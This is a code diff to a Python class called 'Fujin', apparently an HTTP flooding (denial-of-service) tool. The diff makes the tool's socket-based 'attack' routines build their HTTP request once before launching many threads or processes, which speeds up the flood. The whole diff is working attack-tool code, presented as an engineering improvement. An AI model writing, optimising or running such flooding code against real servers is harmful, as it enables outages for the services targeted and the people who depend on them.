@@ -70,6 +70,11 @@ class Fujin:
         self.urllib = ['urllib', 'URLLIB', 'urllib3', 'URLLIB3', 'Urllib', 'Urllib3']
         self.sock = ['socket', 'Socket', 'SOCKET']
 
+        # Variables for Sockets
+        self.socket_hostname = None
+        self.socket_port = None
+        self.socket_request = None
+
 
 
 
@@ -308,10 +313,9 @@ class Fujin:
         """
 
         try:
-            hostname, port, request = self.build_http_request(url=self.url, headers=self.header)
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.connect((hostname, port))
-                s.sendall(request.encode())
+                s.connect((self.socket_hostname, self.socket_port))
+                s.sendall(self.socket_request.encode())
 
                 # Receive the response
                 response = b""
@@ -337,11 +341,9 @@ class Fujin:
         """
 
         try:
-            hostname, port, request = self.build_http_request(url=self.url, headers=self.header)
-
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect((hostname, port))
-            s.sendall(request.encode())
+            s.connect((self.socket_hostname, self.socket_port))
+            s.sendall(self.socket_request.encode())
 
             # Receive the response
             response = b""
@@ -544,6 +546,8 @@ class Fujin:
 
         # Socket Requests (scratch)
         elif pooling_manager in self.sock:
+            self.socket_hostname, self.socket_port, self.socket_request = self.build_http_request(url=self.url, headers=self.header)
+
             for x in range(threads):
                 t=threading.Thread(target=self.begin_socket_async_attack, name=thread_name, daemon=daemon)
                 t.start()
@@ -603,6 +607,8 @@ class Fujin:
 
         # Socket Requests (scratch)
         elif pooling_manager in self.sock:
+            self.socket_hostname, self.socket_port, self.socket_request = self.build_http_request(url=self.url, headers=self.header)
+            
             for x in range(threads):
                 t=threading.Thread(target=self.begin_socket_sync_attack, name=thread_name, daemon=daemon)
                 t.start()
@@ -669,6 +675,7 @@ class Fujin:
 
         # Socket HTTP Requests
         elif pooling_manager in self.sock:
+            self.socket_hostname, self.socket_port, self.socket_request = self.build_http_request(url=self.url, headers=self.header)
             for x in range(numproc):
                 p=multiprocessing.Process(target=self.begin_socket_sync_attack, name=thread_name, daemon=daemon)
                 p.start()
@@ -738,6 +745,7 @@ class Fujin:
 
         # Socket HTTP Requests
         elif pooling_manager in self.sock:
+            self.socket_hostname, self.socket_port, self.socket_request = self.build_http_request(url=self.url, headers=self.header)
             for x in range(numproc):
                 p=multiprocessing.Process(target=self.begin_socket_async_attack, name=thread_name, daemon=daemon)
                 p.start()
